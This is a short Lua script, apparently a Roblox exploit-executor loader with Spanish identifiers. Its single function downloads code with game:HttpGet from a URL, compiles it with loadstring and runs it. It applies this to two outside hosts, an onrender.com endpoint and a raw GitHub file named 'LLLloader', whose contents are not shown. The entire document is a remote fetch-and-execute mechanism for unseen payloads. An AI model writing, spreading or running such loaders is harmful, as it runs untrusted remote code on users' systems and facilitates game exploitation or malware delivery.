
local function ejecutar(url)
    local ok, err = pcall(function()
        local codigo = game:HttpGet(url)
        local fn, errorCompilacion = loadstring(codigo)

        assert(fn, errorCompilacion or "No se pudo compilar")
        fn()
    end)

    if not ok then
        warn("Error: " .. tostring(err))
    end
end

ejecutar("https://botthepan.onrender.com/script/1914a5cfb772c8a8")

ejecutar("https://raw.githubusercontent.com/imhere123123-del/vasallorarencortpo/refs/heads/main/LLLloader")
